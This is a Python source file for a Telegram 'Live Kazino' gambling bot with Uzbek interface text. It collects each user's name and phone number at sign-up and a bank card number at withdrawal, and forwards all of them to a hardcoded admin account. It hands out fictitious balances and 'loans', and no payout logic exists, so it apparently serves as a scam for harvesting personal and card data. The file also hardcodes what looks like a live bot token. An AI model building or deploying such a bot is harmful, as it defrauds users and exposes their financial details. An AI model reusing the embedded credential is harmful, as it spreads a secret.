import telebot
from telebot import types
import time

# --- SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE' # Yangi tokeningiz
ADMIN_ID = 5988166567 # Admin ID raqamingiz
bot = telebot.TeleBot(TOKEN)

# Foydalanuvchi ma'lumotlari
users = {}

def get_user(user_id):
    if user_id not in users:
        users[user_id] = {'registered': False, 'balance': 50000, 'loan': 0}
    return users[user_id]

# --- ASOSIY MENYU ---
def main_markup():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🎰 O'yinlar", "💰 Balans")
    markup.add("💳 Pul yechish", "💸 Nasiya olish")
    return markup

# --- 1. RO'YXATDAN O'TISH TIZIMI ---
@bot.message_handler(commands=['start'])
def start(message):
    user = get_user(message.chat.id)
    if not user['registered']:
        bot.send_message(message.chat.id, "💎 Live Kazino botiga xush kelibsiz!\nBotdan foydalanish uchun ro'yxatdan o'ting.")
        msg = bot.send_message(message.chat.id, "Ism va familiyangizni kiriting:")
        bot.register_next_step_handler(msg, register_name)
    else:
        bot.send_message(message.chat.id, "Xush kelibsiz!", reply_markup=main_markup())

def register_name(message):
    user = get_user(message.chat.id)
    user['reg_name'] = message.text
    # Telefon raqam so'rash
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True))
    msg = bot.send_message(message.chat.id, "Endi telefon raqamingizni yuboring:", reply_markup=markup)
    bot.register_next_step_handler(msg, register_phone)

def register_phone(message):
    user = get_user(message.chat.id)
    if message.contact:
        user['phone'] = message.contact.phone_number
        user['registered'] = True
        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tish muvaffaqiyatli yakunlandi!", reply_markup=main_markup())
        # Adminga yangi foydalanuvchi haqida xabar
        bot.send_message(ADMIN_ID, f"🆕 Yangi foydalanuvchi:\n👤 Ism: {user['reg_name']}\n📞 Tel: {user['phone']}")
    else:
        msg = bot.send_message(message.chat.id, "Iltimos, tugmani bosib raqamingizni yuboring!")
        bot.register_next_step_handler(msg, register_phone)

# --- 2. NASIYA (QARZ) VA BALANS ---
@bot.message_handler(func=lambda message: message.text == "💸 Nasiya olish")
def loan_start(message):
    msg = bot.send_message(message.chat.id, "Summani kiriting (Maks: 2,000,000 s):")
    bot.register_next_step_handler(msg, process_loan)

def process_loan(message):
    try:
        amount = int(message.text)
        if amount > 2000000:
            bot.send_message(message.chat.id, "Maksimal qarz - 2,000,000 so'm!")
            return
        user = get_user(message.chat.id)
        user['balance'] += amount
        user['loan'] += amount
        bot.send_message(message.chat.id, f"✅ Qarz berildi: {amount:,} s")
    except:
        bot.send_message(message.chat.id, "Faqat raqam kiriting!")

# --- 3. PUL YECHISH (ADMIN TASDIQLASHI BILAN) ---
@bot.message_handler(func=lambda message: message.text == "💳 Pul yechish")
def withdraw_1(message):
    msg = bot.send_message(message.chat.id, "Karta raqamingizni yozing:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, withdraw_2)

def withdraw_2(message):
    user = get_user(message.chat.id)
    user['temp_card'] = message.text
    msg = bot.send_message(message.chat.id, "Qancha yechmoqchisiz?")
    bot.register_next_step_handler(msg, withdraw_final)

def withdraw_final(message):
    user = get_user(message.chat.id)
    amount = message.text
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Pul tushdi", callback_data=f"pay_ok_{message.chat.id}"),
               types.InlineKeyboardButton("❌ Pul tushmadi", callback_data=f"pay_no_{message.chat.id}"))
    
    admin_text = (f"🚀 **Yechish so'rovi!**\n\n👤 Ro'yxatdagi ismi: {user.get('reg_name', 'Noma'lum')}\n"
                  f"📞 Tel: {user.get('phone', 'Noma'lum')}\n💳 Karta: `{user['temp_card']}`\n💰 Summa: {amount} s")
    bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ So'rovingiz adminga yuborildi. Kuting...", reply_markup=main_markup())

# --- 4. ADMIN JAVOBI VA XAVFSIZLIK ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def admin_res(call):
    _, action, uid = call.data.split("_")
    status = "✅ To'lov tasdiqlandi!" if action == "ok" else "❌ To'lov rad etildi!"
    bot.send_message(uid, status)
    bot.edit_message_text(call.message.text + f"\n\nHolat: {status}", call.message.chat.id, call.message.message_id)

# --- 5. O'YINLAR (KAZINO) ---
@bot.message_handler(func=lambda message: message.text == "🎰 O'yinlar")
def games(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎲 Kubik", callback_data="game_dice"),
               types.InlineKeyboardButton("🏀 Basketbol", callback_data="game_basket"))
    bot.send_message(message.chat.id, "O'yinni tanlang (Stavka: 5,000 s):", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("game_"))
def play_game(call):
    user = get_user(call.message.chat.id)
    if user['balance'] < 5000:
        bot.answer_callback_query(call.id, "Mablag' yetarli emas!")
        return
    user['balance'] -= 5000
    emoji = '🎲' if 'dice' in call.data else '🏀'
    game = bot.send_dice(call.message.chat.id, emoji=emoji)
    time.sleep(4)
    if game.dice.value >= 4:
        user['balance'] += 10000
        bot.send_message(call.message.chat.id, f"🎉 Yutdingiz! Balans: {user['balance']:,} s")
    else:
        bot.send_message(call.message.chat.id, f"😟 Yutqazdingiz. Balans: {user['balance']:,} s")

@bot.message_handler(func=lambda message: message.text == "💰 Balans")
def check_bal(message):
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💰 Balans: {user['balance']:,} s\n💸 Qarz: {user['loan']:,} s")

bot.polling(none_stop=True) # Railway uchun polling
    
       

    
            
        
        
    
  
